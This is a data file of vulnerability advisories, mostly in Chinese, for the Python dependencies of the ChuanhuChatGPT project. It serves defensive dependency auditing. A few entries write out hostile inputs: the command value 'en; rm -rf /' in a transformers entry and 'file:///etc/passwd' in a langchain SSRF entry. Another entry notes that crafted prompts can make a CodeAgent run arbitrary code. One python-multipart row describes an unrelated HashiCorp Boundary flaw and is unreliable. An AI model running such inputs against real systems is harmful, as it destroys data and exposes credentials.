GaiZhenbiao_ChuanhuChatGPT,langchain,0.1.14,True,,,,<p>MRKLOutputParser 是 Langchain 库中的一个输出解析器，负责解析输入文本并确定相应的操作。然而，该组件的 'parse' 函数未能有效处理输入文本中的正则表达式，当文本中包含恶意输入时，可能导致拒绝服务（ReDoS）攻击。由于正则表达式的执行时间与输入大小呈指数关系，恶意输入可能导致解析时间显著增加，进而使服务器变得不可用。</p>,3,1
GaiZhenbiao_ChuanhuChatGPT,langchain,0.1.14,True,,,,<p>Langchain 是一个用于简化文档加载和处理的 Python 库，具有灵活性和可扩展性。该漏洞允许攻击者使用 'file://' URL 方案从服务器读取任意文件的内容，进而导致敏感信息泄露。具体来说，漏洞源于 PlaywrightWebBaseLoader 组件未能正确限制用户输入，攻击者能够触发页面内容加载任意文件。通过构造特定的请求，攻击者可以下载配置文件、环境变量等敏感信息。</p>,3,1
GaiZhenbiao_ChuanhuChatGPT,langchain,0.1.14,True,,,,<p>BibtexLoader 是 Langchain 社区的一个组件，旨在从 bib 文件中提取引用的文献并加载相关的 PDF 文件。该漏洞是由文件名未经过验证引起的，允许攻击者读取位于 bib 文件目录以外的任意 PDF 文件。例如，攻击者可以通过构造特定的 bibtex 条目来访问上层目录中的 '1.pdf' 文件，从而导致未授权的数据访问。</p>,3,1
GaiZhenbiao_ChuanhuChatGPT,langchain,0.1.14,True,,,,<p>Langchain 是一个基于 Python 的数据处理库，用于构建数据处理管道。该库中的 split_text_from_url 方法存在服务器端请求伪造漏洞，攻击者可以利用这一方法来访问敏感的服务器文件或执行恶意代码。攻击者只需提供特制的 URL，例如通过路径遍历载荷（如 file:///etc/passwd）或恶意的 data URI，即可绕过安全限制，从而导致对机密文件的未授权访问或通过注入的转换实现服务器的破坏。</p>,1,1
GaiZhenbiao_ChuanhuChatGPT,PyPDF2,,True,CVE-2022-24859,CWE-835,2022-04-18,"PyPDF2是一个免费的开源纯 python PDF 库。能够拆分、 合并、 裁剪和转换 PDF 文件的页面。
PyPDF2 存在安全漏洞，该漏洞源于在 1.27.5 之前的版本中，使用此漏洞的攻击者可以制作 PDF，如果代码尝试获取内容流，则如果 PyPDF2 导致无限循环。",3,0
GaiZhenbiao_ChuanhuChatGPT,PyPDF2,,True,,CWE-400,2023-01-02,"## Overview
[PyPDF2](https://pypi.org/project/PyPDF2) is an A pure-python PDF library capable of splitting, merging, cropping, and transforming PDF files

Affected versions of this package are vulnerable to Denial of Service (DoS) due to invalid object. Exploiting this vulnerability is possible when reading the metadata.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `PyPDF2` to version 2.10.6 or higher.
## References
- [GitHub Commit](https://github.com/py-pdf/pypdf/pull/1331/commits/f88a1b022de5822261abec4e7dd9fa0e457a4ee7?show-viewed-files=true&file-filters%5B%5D=)
- [GitHub Issue](https://github.com/py-pdf/pypdf/issues/1329)
- [GitHub PR](https://github.com/py-pdf/pypdf/pull/1331)
",2,2
GaiZhenbiao_ChuanhuChatGPT,PyPDF2,,True,CVE-2023-36810,CWE-407,2023-06-30,"PyPDF2是一个免费的开源纯 python PDF 库。能够拆分、 合并、 裁剪和转换 PDF 文件的页面。
pypdf 1.27.9之前版本存在安全漏洞，该漏洞源于攻击者可以制PDF导致意外的长时间运行，会阻塞进程。",3,0
GaiZhenbiao_ChuanhuChatGPT,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
GaiZhenbiao_ChuanhuChatGPT,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
GaiZhenbiao_ChuanhuChatGPT,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
GaiZhenbiao_ChuanhuChatGPT,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
GaiZhenbiao_ChuanhuChatGPT,openpyxl,,True,CVE-2017-5992,CWE-611,2017-02-15,"Openpyxl是一个用于读写Excel 2010的Python库。
Openpyxl 2.4.1版本存在XML外部实体注入漏洞。远程攻击者可借助特制的文档利用该漏洞读取本地文件，造成应用程序拒绝服务。",3,0
GaiZhenbiao_ChuanhuChatGPT,unstructured,,True,CVE-2024-46455,CWE-611,2024-12-09,"Unstructured是Unstructured开源的一个非结构化数据的开源预处理工具。
Unstructured 0.14.2及之前版本存在安全漏洞，该漏洞源于通过XMLParser容易受到XML外部实体(XXE)攻击。",3,2
GaiZhenbiao_ChuanhuChatGPT,ujson,,True,CVE-2022-31117,CWE-415,2022-07-04,"UltraJSON是开源的一个超快的 JSON 编码器和解码器，用纯 C 语言编写，并绑定了 Python 3.7+。
UltraJSON 5.4.0之前版本存在资源管理错误漏洞，该漏洞源于为字符串解码重新分配缓冲区时发生错误，可能导致缓冲区被释放两次。",3,0
GaiZhenbiao_ChuanhuChatGPT,ujson,,True,CVE-2022-31116,CWE-670,2022-07-05,"UltraJSON是开源的一个超快的 JSON 编码器和解码器，用纯 C 语言编写，并绑定了 Python 3.7+。
UltraJSON 5.4.0之前版本存在安全漏洞，该漏洞源于无法正确解码某些字符，允许字典中潜在的键混淆和值覆盖。",2,2
GaiZhenbiao_ChuanhuChatGPT,python-docx,,True,CVE-2016-5851,CWE-611,2016-04-10,"python-docx是一个用于编辑并生成Microsoft Word文档的python库。
python-docx 0.8.6之前的版本中存在安全漏洞。依赖于上下文的攻击者可借助特制的文件利用该漏洞实施XML External Entity (XXE)攻击。",2,0
GaiZhenbiao_ChuanhuChatGPT,Pillow,>=10.1.0,True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
GaiZhenbiao_ChuanhuChatGPT,Pillow,>=10.1.0,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
GaiZhenbiao_ChuanhuChatGPT,protobuf,3.20.3,True,CVE-2025-4565,CWE-674,2025-06-16,Protobuf 是一种用于序列化结构化数据的库，广泛应用于数据传输、配置文件保存等领域。该漏洞影响 Protobuf 的纯 Python 实现，当对含有任意数量递归组、递归消息或 SGROUP 标签的未受信任数据进行解析时，可能会超过 Python 的递归限制。攻击者可以利用这些递归结构触发无限递归，导致解析进程崩溃，从而造成拒绝服务。,2,2
GaiZhenbiao_ChuanhuChatGPT,python-multipart,0.0.9,True,CVE-2024-12289,CWE-460,2024-12-12,"HashiCorp Boundary是美国HashiCorp公司的一种开源解决方案。可自动实现基于身份的安全用户跨环境访问主机和服务。
HashiCorp Boundary 0.8.0至0.18.1版本存在安全漏洞，该漏洞源于控制器初始化期间错误地处理HTTP请求，会导致Boundary服务器过早终止。",2,0
GaiZhenbiao_ChuanhuChatGPT,python-multipart,0.0.9,True,CVE-2024-53981,CWE-770,2024-12-02,python-multipart 是一个用于 Python 的流式多部分解析器，用于解析表单数据。在解析过程中，python-multipart 会跳过第一个边界前的换行符 (CR \r 或 LF \n) 及最后一个边界后的任何尾部字节。此过程逐字节执行，并在每次操作时发出一个日志事件，可能会因为某些输入导致过多日志记录。攻击者可以通过发送包含大量数据的恶意请求，在第一个边界之前或最后一个边界之后，从而导致高 CPU 负载并阻塞处理线程较长时间。对于 ASGI 应用程序，这可能导致事件循环停滞并阻止其他请求的处理，从而导致拒绝服务 (DoS)。,2,2
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,,CWE-601,2022-11-01,"## Overview
[transformers](https://pypi.org/project/transformers) is a State-of-the-art Machine Learning for JAX, PyTorch and TensorFlow

Affected versions of this package are vulnerable to Open Redirect due to referencing an obsolete link.
## Remediation
Upgrade `transformers` to version 4.23.0 or higher.
## References
- [GitHub Commit](https://github.com/huggingface/transformers/commit/ce2620194b4a8f070cd29504d34a79758affdf95)
- [GitHub PR](https://github.com/huggingface/transformers/pull/19001)
- [GitHub Release](https://github.com/huggingface/transformers/releases/tag/v4.23.0)
",3,0
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,CVE-2023-2800,CWE-377,,Hugging Face Transformers 是用于 JAX、PyTorch 和 TensorFlow 的先进自然语言处理库。该漏洞出现在 4.30.0 之前的版本中，源于使用过时的 tempfile.mktemp() 方法。该方法不安全，因为在调用 mktemp() 与文件创建之间，可能有其他进程创建同名文件。这可能导致文件可用性受干扰，并可能导致敏感信息泄露。,3,1
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,CVE-2023-6730,CWE-502,,Hugging Face Transformers 是为 JAX、PyTorch 和 TensorFlow 提供的先进自然语言处理框架。此组件用于处理自然语言任务，如文本分类、翻译和问答系统等。漏洞发生在 Transformers 4.36.0 之前的版本，其 root cause 是在 `RagRetriever.from_pretrained()` 函数中，`index_name` 和 `index_path` 参数会反序列化不受信任的数据，攻击者可以远程加载恶意 pickle 文件，从而绕过文件检查并在主机上执行任意代码。反序列化是将字节序列转换为对象的过程，被用于通信和存储。此漏洞允许攻击者在未验证数据合法性的情况下进行反序列化，导致代码执行。,1,1
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,CVE-2023-7018,CWE-502,,Hugging Face Transformers是一个用于JAX、PyTorch和TensorFlow的先进自然语言处理库。在受到影响的版本中，使用TransfoXLTokenizer()函数可能会自动加载恶意的vocab.pkl文件，利用pickle.load函数反序列化不受信任的数据。此漏洞源于未能充分验证反序列化的数据，使攻击者可执行任意代码，控制应用程序的状态或执行流程。,1,1
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,CVE-2024-3568,CWE-502,,Hugging Face Transformers 是一个为 Jax、PyTorch 和 TensorFlow 打造的用于先进自然语言处理的库。TFPreTrainedModel 类的 load_repo_checkpoint() 函数存在反序列化不受信任数据的漏洞。该漏洞允许攻击者通过构造恶意的序列化有效负载，利用函数中的 pickle.load() 方法在处理来自可能不受信任源的数据时执行任意代码和命令。这种不安全反序列化的根本原因是缺少对输入数据的信任边界控制，以及对来源不明数据的直接反序列化处理。,4,1
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,CVE-2025-3933,CWE-1333,2025-07-11,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.50.3及之前版本存在安全漏洞，该漏洞源于DonutProcessor类的token2json方法存在正则表达式拒绝服务，可能导致服务中断。",3,2
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,CVE-2025-3263,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于transformers.configuration_utils模块中get_configuration_file函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,CVE-2025-3777,CWE-20,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0及之前版本存在输入验证错误漏洞，该漏洞源于image_utils.py中URL验证不足，可能导致钓鱼攻击。",3,0
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,CVE-2025-3264,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于dynamic_module_utils.py中get_imports函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,CVE-2025-5197,CWE-1333,2025-08-06,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.51.3及之前版本存在安全漏洞，该漏洞源于正则表达式拒绝服务攻击。",3,2
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,CVE-2025-6921,CWE-400,2025-09-23,<p>transformers是Hugging Face开源的一个用于机器学习的应用程序。 transformers 4.53.0之前版本存在资源管理错误漏洞，该漏洞源于_do_use_weight_decay方法处理用户控制的正则表达式时存在缺陷，可能导致正则表达式拒绝服务攻击。</p>,3,2
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,CVE-2024-11394,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的自然语言处理框架。该框架提供构建和应用 Transformer 模型的丰富工具。在其模型文件处理过程中，由于缺乏对用户提供数据的充分验证，导致存在不安全反序列化漏洞，攻击者可以通过插入特制的未验证模型文件进行反序列化，进而在应用中执行任意代码。,4,1
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,CVE-2024-12720,CWE-1333,2025-03-20,Hugging Face Transformers 是一个开源的自然语言处理库，广泛应用于构建和训练先进的模型。该库支持 Jax、PyTorch 和 TensorFlow 的集成。在 tokenization_nougat_fast.py 文件中的 post_process_single() 函数存在正则表达式的处理漏洞。此漏洞由于正则表达式在特定条件下表现出指数时间复杂性，导致出现过度回溯，从而造成 CPU 使用率过高以及应用程序潜在的停机，形成拒绝服务 (DoS) 的场景。受影响的版本是 v4.46.3。,3,2
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,CVE-2024-11392,CWE-502,2024-11-22,Hugging Face Transformers 是一个开源项目，提供 Jax、PyTorch 和 TensorFlow 的自然语言处理模型库。其主要用于构建和训练深度学习模型以及处理自然语言数据。在处理配置文件时，因数据验证不当，导致可能不受信任的数据被反序列化。此漏洞的核心是缺乏对用户输入数据的充分验证，从而使得攻击者能够控制程序执行流，仅需用户访问恶意页面或打开恶意配置文件即可触发。该漏洞允许嵌入恶意代码执行，并在应用环境中获得与当前用户相同的权限。,4,1
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,CVE-2024-11393,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的先进自然语言处理库，提供各种预训练模型以支持多种自然语言处理任务。漏洞存在于模型文件解析过程中，因缺乏对用户输入数据的充分验证，导致不受信任的数据被反序列化。攻击者能利用该漏洞在受影响的安装上以当前用户权限执行任意代码。此漏洞主要影响版本低于4.48.0的转换脚本，但不影响核心库功能。,4,1
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,CVE-2025-1194,CWE-1333,2025-04-29,Hugging Face Transformers 是一个用于自然语言处理的开源库，提供了多种预训练模型以便于开发者快速构建机器学习应用。该漏洞存在于 GPT-NeoX-Japanese 模型的 `tokenization_gpt_neox_japanese.py` 文件中，具体是在 SubWordJapaneseTokenizer 类中。当正则表达式处理经过精心构造的输入时，会导致漏洞产生。根本原因在于某些条件下的正则表达式表现出指数复杂性，导致过度回溯。这可能导致 CPU 使用率升高，进而造成应用程序停机，有效地生成拒绝服务 (DoS) 场景。受影响的版本为 v4.48.1（最新）。,3,2
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,CVE-2025-2099,CWE-1333,2025-05-19,<p>在huggingface/transformers版本v4.48.3的`transformers.testing_utils`模块中，`preprocess_string()`函数存在一个漏洞。该漏洞允许通过正则表达式拒绝服务（ReDoS）攻击进行利用。处理文档字符串中代码块所使用的正则表达式包含嵌套量词，导致在处理含有大量换行符的输入时发生指数级回溯。</p>,3,2
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,CVE-2025-6638,CWE-1333,2025-09-12,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.52.4版本存在安全漏洞，该漏洞源于MarianTokenizer的remove_language_code方法存在正则表达式处理效率问题，可能导致正则表达式拒绝服务。",3,2
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,,,,<p>Transformers是一个支持多种任务的开源自然语言处理库，基于PyTorch和TensorFlow构建。由于在GitHub Actions工作流的分支名称未正确清理，攻击者可以利用此漏洞实现任意代码注入。当攻击者提供特制的分支名称时，可以触发不受信任的命令执行。</p>,2,1
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,,,,<p>HuggingFace Transformers 是一个用于自然语言处理和机器学习的开源库，提供各种工具和模型以简化开发。该库中的 load_tool 功能允许从 HuggingFace Hub 加载外部工具，但存在远程代码执行漏洞。攻击者可以在未启用 `Trust Remote Code` 的情况下，通过从恶意构建的库加载工具，导致执行任意 Python 代码。此漏洞的调用链为 `load_tool() -&gt; Tool.from_hub() -&gt; get_class_from_dynamic_module() -&gt; get_class_in_module() -&gt; importlib.import_module(module_path)`，其中的 importlib.import_module 函数在没有任何警告的情况下执行导入操作。</p>,3,1
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,,,,<p>Transformers 是一个由 Hugging Face 开发的开源自然语言处理模型库，旨在提供强大的模型以简化深度学习任务。该库中的 TransfoXLCorpus 组件存在一个远程代码执行漏洞，当用户按照 Hugging Face 的官方指导使用该模型时，恶意用户可以通过不安全的 torch.load 方法进行攻击。攻击的根本原因在于该方法在未正确处理受信任输入时，可能执行任意可执行代码。具体来说，攻击者可利用该漏洞使受害者在本地执行恶意代码，从而在系统中创建特定文件。</p>,4,1
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,,,,"<p>Transformers 是一个开源的 Python 库，旨在简化和加速使用深度学习模型的自然语言处理任务。在 `build-eval-data.py` 代码片段中，使用用户提供的字符串动态生成 shell 命令。攻击者可以通过输入特定的字符或命令，利用此漏洞进行远程命令注入。例如，如果用户将变量 `src` 或 `tgt` 设置为 ""en; rm -rf /""，那么代码将生成执行 `rm -rf /` 的命令，从而导致系统数据丢失或损坏。由于缺乏对输入的处理和验证，恶意用户可以执行任意 shell 命令。</p>",1,1
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，提供多种模型和工具以简化文本建模的过程。该库的 export 函数 TextDatasetForNextSentencePrediction() 存在一个反序列化漏洞，如果读取的文件路径为 C:/1.txt，程序将会读取当前目录中精心构造的副本。该漏洞的根本原因在于库中对输入数据的处理不当，攻击者可以借此构造恶意数据流通过反序列化执行任意命令。</p>,1,1
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,CVE-2025-6051,CWE-1333,2025-09-14,<p>Hugging Face Transformers 是一个用于自然语言处理 (NLP) 的开源库，提供了许多预训练的模型和工具，广泛应用于文本分类、机器翻译、文本生成等任务。此漏洞存在于该库的 `EnglishNormalizer` 类的 `normalize_numbers()` 方法中。该方法用于对数字字符串进行归一化处理，但在处理特制的长数字序列时，由于正则表达式匹配效率低下，会导致 CPU 资源过度消耗。攻击者可以通过向应用程序发送特制的输入数据，触发该漏洞，进而导致系统性能严重下降。</p>,3,2
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，旨在借助深度学习模型简化文本处理任务。WaitCanDeadlock 漏洞是一种与并发相关的特定问题，通常发生在多线程系统中。当一个持有锁的线程被迫无期限地等待一个无法满足的条件时，可能导致死锁场景的发生。这种漏洞的触发条件为：使用 subprocess.Popen 启动子进程并直接调用 proc.wait()，如果子进程输出内容过大时，就可能会导致死锁，因此建议使用 proc.communicate() 方法来避免这一问题。</p>,1,1
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,,,,<p>Transformers 是一个基于 Python 的开源机器学习库，专注于自然语言处理任务。该库中的 CodeAgent 组件负责生成并执行解决任务的代码。然而，由于未能对生成的代码进行检查，攻击者可以通过精心构造的提示直接执行任意代码，从而导致代码执行漏洞。攻击者无需额外的授权导入即可利用此漏洞。</p>,2,1
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,,,,<p>Transformers是一个用于自然语言处理的开源Python库，能够处理预训练模型和变换器架构。当该库使用已不再安全的函数`tempfile.mktemp()`时，存在一个不安全的临时文件漏洞。由于调用`mktemp()`和随后尝试创建文件之间可能会有其他进程创建同名文件，这使得该函数不再安全。这使攻击者可以在文件打开之前影响文件内容。</p>,3,1
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,,,,<p>Transformers 是一个开源的 Python 库，用于构建和训练深度学习模型，特别是在自然语言处理方面。当用户使用 convert_maskformer_resnet_to_pytorch.py 脚本，并通过 --checkpoint_path 参数提供一个恶意的 .pkl 文件时，该脚本使用 pickle.load 进行不安全的反序列化。这使得攻击者可以在用户的系统上执行嵌入在 pickle 文件中的任意恶意代码。</p>,2,1
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源库，旨在为研究人员和开发者提供强大的工具以训练和应用转化器模型。该库中的 Transformer-XL 模型在执行反序列化操作时存在安全漏洞，具体是在 convert_transfo_xl_original_tf_checkpoint_to_pytorch.py 脚本中使用了 pickle.load，从而导致恶意的 pickle 文件可以被用来执行任意代码。如果攻击者能够控制传入的文件，他们可以创建一个恶意文件“一旦加载” 就可以在受害者系统上执行代码。该漏洞可以通过提供一个精心构造的 pickle 文件（例如，包含打开计算器应用的代码）进行利用。</p>,2,1
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,,,,<p>transformers 是一个开源的 Python 库，主要用于自然语言处理，具有强大的模型支持。在 utils/check_self_hosted_runner.py 文件中存在命令注入漏洞。攻击者可以通过在服务或 Web 服务器中运行该工具实现任意命令执行。该漏洞的根本原因是使用了 shell=True，在 subprocess.run 函数中直接注入用户提供的命令。利用该漏洞，攻击者可以执行任意命令，例如通过特制的命令参数获取系统敏感信息。</p>,4,1
GaiZhenbiao_ChuanhuChatGPT,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源 Python 库，旨在使机器学习模型的使用更为简单和可访问。该漏洞涉及用户在 https://huggingface.co/ 上传的个人资料图片，其 EXIF 地理位置数据未被去除。这导致任何人都可以获取用户的敏感信息，例如他们的地理位置和设备信息（如设备名称、版本、使用的软件及其版本等）。</p>,3,1
GaiZhenbiao_ChuanhuChatGPT,torch,,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
GaiZhenbiao_ChuanhuChatGPT,torch,,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
GaiZhenbiao_ChuanhuChatGPT,torch,,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
GaiZhenbiao_ChuanhuChatGPT,torch,,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
GaiZhenbiao_ChuanhuChatGPT,torch,,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
GaiZhenbiao_ChuanhuChatGPT,torch,,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
GaiZhenbiao_ChuanhuChatGPT,torch,,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
GaiZhenbiao_ChuanhuChatGPT,torch,,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
GaiZhenbiao_ChuanhuChatGPT,torch,,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
GaiZhenbiao_ChuanhuChatGPT,torch,,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
GaiZhenbiao_ChuanhuChatGPT,torch,,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
GaiZhenbiao_ChuanhuChatGPT,torch,,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
